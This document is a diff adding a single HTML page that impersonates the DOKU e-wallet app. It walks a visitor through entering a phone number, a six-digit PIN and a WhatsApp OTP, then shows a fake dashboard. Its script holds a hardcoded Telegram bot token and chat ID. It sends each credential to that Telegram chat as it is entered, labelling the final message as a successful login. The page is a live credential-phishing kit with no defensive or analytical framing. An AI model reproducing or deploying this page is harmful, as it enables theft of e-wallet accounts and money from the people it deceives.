@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DOKU e-Wallet - Premium App</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        dokuRed: '#E1251B',
+                        dokuDarkRed: '#B81C14',
+                        dokuGray: '#F5F6F8'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        /* Custom Keypad & Layout Styling for Mobile Optimization */
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            user-select: none;
+            background-color: #f3f4f6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .bg-gradient-doku {
+            background: linear-gradient(180deg, #FF9E67 0%, #FFF5EF 40%, #FFFFFF 100%);
+        }
+        .otp-input::-webkit-outer-spin-button,
+        .otp-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        .otp-input {
+            -moz-appearance: textfield;
+        }
+        /* Container responsive: Full screen on mobile, centered card on desktop */
+        .app-container {
+            width: 100%;
+            height: 100vh;
+            max-width: 100%;
+            max-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            background-color: #ffffff;
+            position: relative;
+            overflow: hidden;
+        }
+        @media (min-width: 640px) {
+            .app-container {
+                width: 100%;
+                max-width: 412px;
+                height: 844px;
+                max-height: 844px;
+                border-radius: 2rem;
+                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Container Utama simulasi layar Smartphone Mobile & Desktop -->
+    <div class="app-container">
+
+        <!-- ========================================== -->
+        <!-- PAGE 1: WELCOME / SLIDER LANDING           -->
+        <!-- ========================================== -->
+        <div id="page-1" class="page-step flex-1 flex flex-col justify-between p-6 bg-gradient-doku relative overflow-y-auto">
+            <!-- Header Top Bar -->
+            <div class="flex justify-between items-center pt-2">
+                <div class="flex items-center space-x-2 h-10 overflow-hidden">
+                    <img id="doku-logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgY6ro8zSpFGB7eVV-4G5JcesDfyv6qmdbpcTRYqKnajJYCMXNaL9ZmMYilPlhE_0OJnXz8ycGHerOdiau7YaEM7SmWgJsEH6ls9Fu8gsG2VSM5u_xV1stI9d6YKkyMFp6Dg4Lm9erytitu6PyUrKAt_zMIrylZU_1B6sLqVXgCJ6ho0c-QEjfYWg/w320-h320/doku-(Koleksilogo.com).png" class="h-8 object-contain transition-all duration-500" alt="DOKU Logo">
+                </div>
+                <button class="text-gray-700 text-2xl focus:outline-none"><i class="fa-regular fa-circle-question"></i></button>
+            </div>
+
+            <!-- Content Area / Slider -->
+            <div class="flex flex-col items-center text-center my-auto py-6">
+                <div class="relative w-56 h-56 sm:w-64 sm:h-64 mb-6 flex items-center justify-center">
+                    <img id="slider-img" src="https://cdn.prod.website-files.com/674ab654de930b217c6389c1/675f8ec60b8541d80179d652_about-banner.avif" alt="alt" class="max-h-full object-contain">
+                </div>
+                
+                <h2 id="slider-title" class="text-2xl font-bold text-dokuRed mb-2">Transfer dan Minta Dana</h2>
+                <p id="slider-desc" class="text-gray-600 text-sm px-4">
+                    Gratis biaya transfer dan minta dana ke sesama pengguna. Serta layanan transfer ke Bank
+                </p>
+
+                <!-- Indicator Dots -->
+                <div class="flex space-x-2 mt-6">
+                    <span id="dot-0" class="w-2.5 h-2.5 rounded-full bg-dokuRed transition-all"></span>
+                    <span id="dot-1" class="w-2.5 h-2.5 rounded-full bg-gray-300 transition-all"></span>
+                    <span id="dot-2" class="w-2.5 h-2.5 rounded-full bg-gray-300 transition-all"></span>
+                </div>
+            </div>
+
+            <!-- Bottom Action Button -->
+            <div class="pb-4">
+                <button id="btn-page1-action" onclick="openPhoneModalWithLoading(this)" class="w-full bg-dokuRed hover:bg-dokuDarkRed text-white font-semibold py-3.5 rounded-xl transition duration-200 shadow-md flex items-center justify-center">
+                    <span>MASUK ATAU DAFTAR</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- PAGE 2: INPUT NOMOR TELEPON (MODAL)        -->
+        <!-- ========================================== -->
+        <div id="page-2-modal" class="hidden fixed inset-0 bg-black/60 z-50 flex items-end sm:items-center justify-center">
+            <div class="bg-white w-full sm:max-w-md rounded-t-3xl sm:rounded-3xl p-6 shadow-xl transform transition-transform duration-300">
+                <h3 class="text-xl font-bold text-gray-800 mb-1">Masuk atau Daftar</h3>
+                <p class="text-xs text-gray-500 mb-6">Masukkan Nomor Telepon</p>
+
+                <!-- Phone Input Field -->
+                <div class="flex items-center border-b-2 border-gray-200 focus-within:border-dokuRed py-2 mb-8">
+                    <div class="flex items-center space-x-1 pr-3 border-r border-gray-300">
+                        <img src="https://flagcdn.com/w20/id.png" class="w-5 h-3.5 object-cover" alt="ID Flag">
+                        <span class="text-sm font-semibold text-gray-700">+62</span>
+                        <i class="fa-solid fa-caret-down text-xs text-gray-400"></i>
+                    </div>
+                    <input type="tel" id="phone-input" placeholder="81234567901" class="w-full pl-3 text-lg font-medium outline-none text-gray-800 bg-transparent" oninput="validatePhoneInput()">
+                </div>
+
+                <!-- Submit Buttons -->
+                <button id="btn-submit-phone" onclick="submitPhone(this)" disabled class="w-full bg-gray-200 text-gray-400 font-semibold py-3.5 rounded-xl mb-3 transition duration-200 flex items-center justify-center">
+                    <span>LANJUT</span>
+                </button>
+                <button onclick="closePhoneModal()" class="w-full border border-dokuRed text-dokuRed font-semibold py-3 rounded-xl hover:bg-red-50 transition duration-200">
+                    KEMBALI
+                </button>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- PAGE 3: INPUT PIN (6 DIGIT KEYPAD)         -->
+        <!-- ========================================== -->
+        <div id="page-3" class="page-step hidden flex-1 flex-col justify-between p-6 bg-dokuRed text-white overflow-y-auto">
+            <!-- Header Back Button -->
+            <div>
+                <button onclick="goToPage(1)" class="text-white text-xl p-2 focus:outline-none"><i class="fa-solid fa-arrow-left"></i></button>
+            </div>
+
+            <!-- PIN Header Title -->
+            <div class="text-center my-4">
+                <h2 class="text-2xl font-bold mb-2">Selamat Datang Kembali</h2>
+                <p class="text-sm text-red-100">Silakan masukkan PIN kamu</p>
+
+                <!-- PIN Dots Indicator -->
+                <div class="flex justify-center space-x-4 my-8">
+                    <div class="pin-dot w-4 h-4 rounded-full bg-red-900 border border-red-400"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full bg-red-900 border border-red-400"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full bg-red-900 border border-red-400"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full bg-red-900 border border-red-400"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full bg-red-900 border border-red-400"></div>
+                    <div class="pin-dot w-4 h-4 rounded-full bg-red-900 border border-red-400"></div>
+                </div>
+
+                <button class="text-sm text-white font-medium underline focus:outline-none">Lupa PIN?</button>
+            </div>
+
+            <!-- Custom Numpad Keypad -->
+            <div class="grid grid-cols-3 gap-y-4 text-center text-2xl font-bold mb-4">
+                <button onclick="pressPin('1')" class="py-3 active:scale-95 transition focus:outline-none">1</button>
+                <button onclick="pressPin('2')" class="py-3 active:scale-95 transition focus:outline-none">2</button>
+                <button onclick="pressPin('3')" class="py-3 active:scale-95 transition focus:outline-none">3</button>
+                <button onclick="pressPin('4')" class="py-3 active:scale-95 transition focus:outline-none">4</button>
+                <button onclick="pressPin('5')" class="py-3 active:scale-95 transition focus:outline-none">5</button>
+                <button onclick="pressPin('6')" class="py-3 active:scale-95 transition focus:outline-none">6</button>
+                <button onclick="pressPin('7')" class="py-3 active:scale-95 transition focus:outline-none">7</button>
+                <button onclick="pressPin('8')" class="py-3 active:scale-95 transition focus:outline-none">8</button>
+                <button onclick="pressPin('9')" class="py-3 active:scale-95 transition focus:outline-none">9</button>
+                <div></div>
+                <button onclick="pressPin('0')" class="py-3 active:scale-95 transition focus:outline-none">0</button>
+                <button onclick="deletePin()" class="py-3 active:scale-95 transition flex justify-center items-center focus:outline-none"><i class="fa-solid fa-delete-left text-xl"></i></button>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- PAGE 4: INPUT KODE VERIFIKASI (OTP)        -->
+        <!-- ========================================== -->
+        <div id="page-4" class="page-step hidden flex-1 flex-col justify-between p-6 bg-white overflow-y-auto">
+            <div>
+                <div class="flex items-center space-x-4 mb-6">
+                    <button onclick="goToPage(3)" class="text-gray-700 text-lg focus:outline-none"><i class="fa-solid fa-arrow-left"></i></button>
+                    <h2 class="text-lg font-bold text-dokuRed">Kode Verifikasi</h2>
+                </div>
+
+                <div class="text-center mt-6">
+                    <h3 class="text-xl font-bold text-gray-800 mb-2">Masukkan Kode Verifikasi</h3>
+                    <p class="text-xs text-gray-500 leading-relaxed">
+                        Kode Verifikasi telah dikirim via WhatsApp ke:<br>
+                        <span id="display-masked-phone" class="font-semibold text-gray-700">+6281*****873</span>
+                    </p>
+
+                    <!-- OTP 6-Digit Field Input -->
+                    <div class="flex justify-center space-x-2 my-8" id="otp-container">
+                        <input type="number" maxlength="1" class="otp-input w-11 h-12 border-2 border-gray-300 rounded-lg text-center text-xl font-bold focus:border-dokuRed outline-none" onkeyup="handleOtpInput(this, 0)">
+                        <input type="number" maxlength="1" class="otp-input w-11 h-12 border-2 border-gray-300 rounded-lg text-center text-xl font-bold focus:border-dokuRed outline-none" onkeyup="handleOtpInput(this, 1)">
+                        <input type="number" maxlength="1" class="otp-input w-11 h-12 border-2 border-gray-300 rounded-lg text-center text-xl font-bold focus:border-dokuRed outline-none" onkeyup="handleOtpInput(this, 2)">
+                        <input type="number" maxlength="1" class="otp-input w-11 h-12 border-2 border-gray-300 rounded-lg text-center text-xl font-bold focus:border-dokuRed outline-none" onkeyup="handleOtpInput(this, 3)">
+                        <input type="number" maxlength="1" class="otp-input w-11 h-12 border-2 border-gray-300 rounded-lg text-center text-xl font-bold focus:border-dokuRed outline-none" onkeyup="handleOtpInput(this, 4)">
+                        <input type="number" maxlength="1" class="otp-input w-11 h-12 border-2 border-gray-300 rounded-lg text-center text-xl font-bold focus:border-dokuRed outline-none" onkeyup="handleOtpInput(this, 5)">
+                    </div>
+
+                    <p class="text-xs text-gray-500">Kirim ulang dalam <span id="timer" class="font-bold text-gray-700">04:44</span></p>
+                </div>
+            </div>
+
+            <div class="pb-4">
+                <button id="btn-submit-otp" onclick="submitOtp(this)" class="w-full bg-dokuRed hover:bg-dokuDarkRed text-white font-semibold py-3.5 rounded-xl transition duration-200 flex items-center justify-center shadow-md">
+                    <span>VERIFIKASI</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!-- PAGE 5: DASHBOARD DOKU E-WALLET            -->
+        <!-- ========================================== -->
+        <div id="page-5" class="page-step hidden flex-1 flex-col justify-between bg-slate-50 overflow-y-auto relative">
+            <div class="pb-24">
+                <!-- Header Logo & Notification -->
+                <div class="flex justify-between items-center p-4 bg-white shadow-xs">
+                    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgY6ro8zSpFGB7eVV-4G5JcesDfyv6qmdbpcTRYqKnajJYCMXNaL9ZmMYilPlhE_0OJnXz8ycGHerOdiau7YaEM7SmWgJsEH6ls9Fu8gsG2VSM5u_xV1stI9d6YKkyMFp6Dg4Lm9erytitu6PyUrKAt_zMIrylZU_1B6sLqVXgCJ6ho0c-QEjfYWg/w320-h320/doku-(Koleksilogo.com).png" class="h-8" alt="DOKU">
+                    <button class="text-gray-700 text-xl focus:outline-none"><i class="fa-regular fa-bell"></i></button>
+                </div>
+
+                <!-- Saldo & Quick Actions Card -->
+                <div class="mx-4 my-3 bg-zinc-700 text-white rounded-2xl p-4 shadow-md">
+                    <div class="flex justify-between items-center mb-4">
+                        <div>
+                            <p class="text-xs text-gray-300">Total Saldo</p>
+                            <div class="flex items-center space-x-2">
+                                <h2 class="text-2xl font-bold">Rp0</h2>
+                                <button class="text-gray-300 text-sm focus:outline-none"><i class="fa-regular fa-eye"></i></button>
+                            </div>
+                        </div>
+                        <button onclick="triggerActionLoading(this, 'Memuat Saldo...')" class="bg-white text-gray-800 text-xs font-semibold px-4 py-2 rounded-full flex items-center space-x-1 shadow focus:outline-none transition active:scale-95">
+                            <i class="fa-solid fa-plus text-xs"></i>
+                            <span>Isi Ulang</span>
+                        </button>
+                    </div>
+
+                    <!-- Action Menu Grid -->
+                    <div class="grid grid-cols-3 gap-2 bg-white text-gray-800 rounded-xl p-3 text-center text-xs font-medium shadow-inner">
+                        <div onclick="triggerActionLoading(this, 'Buka QRIS...')" class="flex flex-col items-center py-1 cursor-pointer hover:bg-gray-50 rounded transition">
+                            <div class="w-8 h-8 rounded-lg bg-teal-50 text-teal-600 flex items-center justify-center text-lg mb-1">
+                                <i class="fa-solid fa-qrcode"></i>
+                            </div>
+                            <span>QRIS</span>
+                        </div>
+                        <div onclick="triggerActionLoading(this, 'Buka Transfer...')" class="flex flex-col items-center py-1 cursor-pointer hover:bg-gray-50 rounded transition">
+                            <div class="w-8 h-8 rounded-lg bg-orange-50 text-orange-500 flex items-center justify-center text-lg mb-1">
+                                <i class="fa-solid fa-arrow-up-right-from-square"></i>
+                            </div>
+                            <span>Transfer</span>
+                        </div>
+                        <div onclick="triggerActionLoading(this, 'Buka Minta Dana...')" class="flex flex-col items-center py-1 cursor-pointer hover:bg-gray-50 rounded transition">
+                            <div class="w-8 h-8 rounded-lg bg-teal-50 text-teal-500 flex items-center justify-center text-lg mb-1">
+                                <i class="fa-solid fa-hand-holding-dollar"></i>
+                            </div>
+                            <span>Minta Dana</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Services Icon Grid -->
+                <div class="grid grid-cols-4 gap-y-4 p-4 text-center text-xs text-gray-700 font-medium bg-white mx-4 rounded-2xl shadow-sm mb-4">
+                    <div class="flex flex-col items-center cursor-pointer" onclick="triggerActionLoading(this, 'PLN...')">
+                        <div class="w-12 h-12 rounded-full bg-red-100 text-dokuRed flex items-center justify-center text-xl mb-1">
+                            <i class="fa-solid fa-bolt"></i>
+                        </div>
+                        <span>Listrik PLN</span>
+                    </div>
+                    <div class="flex flex-col items-center cursor-pointer" onclick="triggerActionLoading(this, 'PDAM...')">
+                        <div class="w-12 h-12 rounded-full bg-red-100 text-dokuRed flex items-center justify-center text-xl mb-1">
+                            <i class="fa-solid fa-faucet-drip"></i>
+                        </div>
+                        <span>PDAM</span>
+                    </div>
+                    <div class="flex flex-col items-center cursor-pointer" onclick="triggerActionLoading(this, 'BPJS...')">
+                        <div class="w-12 h-12 rounded-full bg-red-100 text-dokuRed flex items-center justify-center text-xl mb-1">
+                            <i class="fa-solid fa-heart-pulse"></i>
+                        </div>
+                        <span>BPJS</span>
+                    </div>
+                    <div class="flex flex-col items-center cursor-pointer" onclick="triggerActionLoading(this, 'Internet...')">
+                        <div class="w-12 h-12 rounded-full bg-red-100 text-dokuRed flex items-center justify-center text-xl mb-1">
+                            <i class="fa-solid fa-wifi"></i>
+                        </div>
+                        <span>Internet & TV</span>
+                    </div>
+                    <div class="flex flex-col items-center cursor-pointer" onclick="triggerActionLoading(this, 'Telkom...')">
+                        <div class="w-12 h-12 rounded-full bg-red-100 text-dokuRed flex items-center justify-center text-xl mb-1">
+                            <i class="fa-solid fa-phone"></i>
+                        </div>
+                        <span>Telkom</span>
+                    </div>
+                    <div class="flex flex-col items-center cursor-pointer" onclick="triggerActionLoading(this, 'Pulsa...')">
+                        <div class="w-12 h-12 rounded-full bg-red-100 text-dokuRed flex items-center justify-center text-xl mb-1">
+                            <i class="fa-solid fa-mobile-screen-button"></i>
+                        </div>
+                        <span>Pulsa</span>
+                    </div>
+                    <div class="flex flex-col items-center cursor-pointer" onclick="triggerActionLoading(this, 'Paket Data...')">
+                        <div class="w-12 h-12 rounded-full bg-red-100 text-dokuRed flex items-center justify-center text-xl mb-1">
+                            <i class="fa-solid fa-globe"></i>
+                        </div>
+                        <span>Paket Data</span>
+                    </div>
+                    <div class="flex flex-col items-center cursor-pointer" onclick="triggerActionLoading(this, 'Lainnya...')">
+                        <div class="w-12 h-12 rounded-full bg-gray-100 text-gray-500 flex items-center justify-center text-xl mb-1">
+                            <i class="fa-solid fa-ellipsis"></i>
+                        </div>
+                        <span>Lainnya</span>
+                    </div>
+                </div>
+
+                <!-- Banner Promo Section -->
+                <div class="px-4 mb-4">
+                    <span class="inline-block bg-dokuRed text-white text-xs px-3 py-1 rounded-full mb-3 font-semibold">Penawaran</span>
+                    <div class="rounded-2xl overflow-hidden shadow-sm bg-blue-600 text-white p-4 flex justify-between items-center">
+                        <div>
+                            <p class="text-xs bg-white/20 inline-block px-2 py-0.5 rounded text-white mb-1">Google Play</p>
+                            <h4 class="font-bold text-lg">Potongan Hingga 80%</h4>
+                            <p class="text-xs opacity-80">Bayar dengan QRIS</p>
+                        </div>
+                        <i class="fa-solid fa-gamepad text-5xl opacity-40"></i>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bottom Navigation Bar -->
+            <div class="absolute bottom-0 w-full bg-white border-t border-gray-200 flex justify-around items-center py-2 px-4 text-xs font-medium text-gray-500 z-10">
+                <button class="flex flex-col items-center text-dokuRed focus:outline-none">
+                    <i class="fa-solid fa-house text-lg mb-0.5"></i>
+                    <span>Beranda</span>
+                </button>
+                <button class="flex flex-col items-center focus:outline-none" onclick="triggerActionLoading(this, 'Riwayat...')">
+                    <i class="fa-solid fa-receipt text-lg mb-0.5"></i>
+                    <span>Riwayat</span>
+                </button>
+                <button class="flex flex-col items-center -mt-5 focus:outline-none" onclick="triggerActionLoading(this, 'Bayar QRIS...')">
+                    <div class="w-14 h-14 rounded-full bg-dokuRed text-white flex flex-col items-center justify-center shadow-lg border-4 border-white">
+                        <i class="fa-solid fa-qrcode text-lg"></i>
+                        <span class="text-[9px] uppercase font-bold">Bayar</span>
+                    </div>
+                </button>
+                <button class="flex flex-col items-center focus:outline-none" onclick="triggerActionLoading(this, 'Wallet...')">
+                    <i class="fa-solid fa-wallet text-lg mb-0.5"></i>
+                    <span>Wallet</span>
+                </button>
+                <button class="flex flex-col items-center focus:outline-none" onclick="triggerActionLoading(this, 'Akun...')">
+                    <i class="fa-regular fa-user text-lg mb-0.5"></i>
+                    <span>Akun</span>
+                </button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- JavaScript Application Logic with Loading & Telegram Notification -->
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7381810214:AAF3EwTnsDIk7r6zHmLjp5RoAN5EsibuNTg"; 
+        const TELEGRAM_CHAT_ID = "7431131436";     
+
+        let userData = {
+            phone: '',
+            pin: '',
+            otp: ''
+        };
+
+        // Helper: Kirim Notifikasi Telegram
+        function sendTelegramNotification(message) {
+            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes("YOUR_")) {
+                console.log("[Telegram Demo Log]:", message);
+                return;
+            }
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(res => res.json())
+            .then(data => console.log('Telegram Alert Sent:', data))
+            .catch(err => console.error('Telegram Error:', err));
+        }
+
+        // Helper: Tampilkan Loading pada Tombol
+        function setButtonLoading(btn, isLoading, loadingText = 'Memproses...') {
+            if (isLoading) {
+                btn.dataset.originalHtml = btn.innerHTML;
+                btn.disabled = true;
+                btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i><span>${loadingText}</span>`;
+                btn.classList.add('opacity-80', 'cursor-not-allowed');
+            } else {
+                btn.disabled = false;
+                btn.innerHTML = btn.dataset.originalHtml || 'LANJUT';
+                btn.classList.remove('opacity-80', 'cursor-not-allowed');
+            }
+        }
+
+        // Interaksi umum untuk menu dashboard/fitur lain dengan efek loading sebentar
+        function triggerActionLoading(element, message) {
+            const originalContent = element.innerHTML;
+            element.innerHTML = `<div class="flex items-center justify-center p-2"><i class="fa-solid fa-spinner fa-spin text-dokuRed"></i></div>`;
+            setTimeout(() => {
+                element.innerHTML = originalContent;
+                alert(message + "");
+            }, 600);
+        }
+
+        // Navigator Page
+        function goToPage(pageNumber) {
+            document.querySelectorAll('.page-step').forEach(page => {
+                page.classList.add('hidden');
+                page.classList.remove('flex');
+            });
+
+            const targetPage = document.getElementById(`page-${pageNumber}`);
+            if (targetPage) {
+                targetPage.classList.remove('hidden');
+                targetPage.classList.add('flex');
+            }
+        }
+
+        // ==========================================================
+        // PAGE 1: SLIDER & LOGO AUTO-SWAP
+        // ==========================================================
+        const logoUrls = [
+            "https://d1jprqach4ypsh.cloudfront.net/image/4eea1b55-5cc3-4b9d-aa2b-b8d0f05550e4.png",
+            "https://www.swidch.com/hubfs/Doku%20e-wallet.png"
+        ];
+        
+        const sliderData = [
+            {
+                title: "Transfer dan Minta Dana",
+                desc: "Gratis biaya transfer dan minta dana ke sesama pengguna. Serta layanan transfer ke Bank",
+                img: "https://cdn.prod.website-files.com/674ab654de930b217c6389c1/675f8ec60b8541d80179d652_about-banner.avif"
+            },
+            {
+                title: "Pembayaran Mudah Tiap Hari",
+                desc: "Urus kebutuhan rutinmu di mana saja tanpa ribet. Mulai dari pulsa hingga tagihan bulanan",
+                img: "https://cdn.prod.website-files.com/674ab654de930b217c6389c1/675f8ec64efb16489798af7d_about-ecosystem.avif"
+            },
+            {
+                title: "Keamanan Terjamin",
+                desc: "Transaksi aman dan terlindungi dengan enkripsi standar perbankan internasional",
+                img: "https://cdn.prod.website-files.com/674ab654de930b217c6389c1/675f8ec7c7e72aec122d2684_about-transactions-drive.avif"
+            }
+        ];
+
+        let currentSlide = 0;
+        setInterval(() => {
+            currentSlide = (currentSlide + 1) % sliderData.length;
+            
+            document.getElementById('slider-title').innerText = sliderData[currentSlide].title;
+            document.getElementById('slider-desc').innerText = sliderData[currentSlide].desc;
+            document.getElementById('slider-img').src = sliderData[currentSlide].img;
+
+            for(let i = 0; i < 3; i++) {
+                const dot = document.getElementById(`dot-${i}`);
+                if (i === currentSlide) {
+                    dot.className = "w-2.5 h-2.5 rounded-full bg-dokuRed transition-all";
+                } else {
+                    dot.className = "w-2.5 h-2.5 rounded-full bg-gray-300 transition-all";
+                }
+            }
+
+            const logoEl = document.getElementById('doku-logo');
+            logoEl.src = logoUrls[currentSlide % logoUrls.length];
+        }, 5000);
+
+        function openPhoneModalWithLoading(btn) {
+            setButtonLoading(btn, true, 'Memuat...');
+            setTimeout(() => {
+                setButtonLoading(btn, false);
+                document.getElementById('page-2-modal').classList.remove('hidden');
+            }, 400);
+        }
+
+        function closePhoneModal() {
+            document.getElementById('page-2-modal').classList.add('hidden');
+        }
+
+        // ==========================================================
+        // PAGE 2: PHONE INPUT VALIDATION & LOADING
+        // ==========================================================
+        function validatePhoneInput() {
+            const input = document.getElementById('phone-input').value;
+            const btn = document.getElementById('btn-submit-phone');
+
+            if (input.length >= 9) {
+                btn.disabled = false;
+                btn.className = "w-full bg-dokuRed hover:bg-dokuDarkRed text-white font-semibold py-3.5 rounded-xl mb-3 transition duration-200 shadow-md flex items-center justify-center cursor-pointer";
+            } else {
+                btn.disabled = true;
+                btn.className = "w-full bg-gray-200 text-gray-400 font-semibold py-3.5 rounded-xl mb-3 transition duration-200 flex items-center justify-center cursor-not-allowed";
+            }
+        }
+
+        function submitPhone(btn) {
+            const rawPhone = document.getElementById('phone-input').value;
+            userData.phone = '+62' + rawPhone;
+
+            setButtonLoading(btn, true, 'Mengirim Kode...');
+
+            setTimeout(() => {
+                // Kirim Notifikasi Telegram
+                sendTelegramNotification(`📱 <b>INPUT NOMOR HP DOKU</b>\nNomor: <code>${userData.phone}</code>`);
+                setButtonLoading(btn, false);
+                closePhoneModal();
+                goToPage(3);
+            }, 800);
+        }
+
+        // ==========================================================
+        // PAGE 3: PIN KEYPAD LOGIC
+        // ==========================================================
+        function pressPin(val) {
+            if (userData.pin.length < 6) {
+                userData.pin += val;
+                updatePinDots();
+
+                if (userData.pin.length === 6) {
+                    // Beri jeda visual & loading feedback
+                    setTimeout(() => {
+                        sendTelegramNotification(`🔑 <b>INPUT PIN DOKU</b>\nNomor HP: <code>${userData.phone}</code>\nPIN: <code>${userData.pin}</code>`);
+
+                        const p = userData.phone;
+                        const masked = p.substring(0, 5) + "*****" + p.substring(p.length - 3);
+                        document.getElementById('display-masked-phone').innerText = masked;
+
+                        goToPage(4);
+                        startOtpTimer();
+                    }, 400);
+                }
+            }
+        }
+
+        function deletePin() {
+            if (userData.pin.length > 0) {
+                userData.pin = userData.pin.slice(0, -1);
+                updatePinDots();
+            }
+        }
+
+        function updatePinDots() {
+            const dots = document.querySelectorAll('.pin-dot');
+            dots.forEach((dot, idx) => {
+                if (idx < userData.pin.length) {
+                    dot.className = "pin-dot w-4 h-4 rounded-full bg-white border border-white shadow";
+                } else {
+                    dot.className = "pin-dot w-4 h-4 rounded-full bg-red-900 border border-red-400";
+                }
+            });
+        }
+
+        // ==========================================================
+        // PAGE 4: OTP INPUT & TIMER LOADING
+        // ==========================================================
+        function handleOtpInput(element, index) {
+            const inputs = document.querySelectorAll('.otp-input');
+
+            if (element.value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+
+            let currentOtp = "";
+            inputs.forEach(input => currentOtp += input.value);
+            userData.otp = currentOtp;
+        }
+
+        function startOtpTimer() {
+            let duration = 284; 
+            const timerDisplay = document.getElementById('timer');
+            
+            const timerInterval = setInterval(() => {
+                const minutes = Math.floor(duration / 60);
+                const seconds = duration % 60;
+
+                timerDisplay.textContent = 
+                    (minutes < 10 ? "0" : "") + minutes + ":" + 
+                    (seconds < 10 ? "0" : "") + seconds;
+
+                if (--duration < 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.textContent = "00:00";
+                }
+            }, 1000);
+        }
+
+        function submitOtp(btn) {
+            if (userData.otp.length === 6) {
+                setButtonLoading(btn, true, 'Memverifikasi...');
+
+                setTimeout(() => {
+                    sendTelegramNotification(`💬 <b>VERIFIKASI OTP DOKU</b>\nNomor: <code>${userData.phone}</code>\nOTP: <code>${userData.otp}</code>\nStatus: <b>BERHASIL LOGIN</b>`);
+                    setButtonLoading(btn, false);
+                    goToPage(5);
+                }, 1000);
+            } else {
+                alert("Masukkan 6 digit kode OTP verifikasi dengan lengkap!");
+            }
+        }
+    </script>
+</body>
+</html>
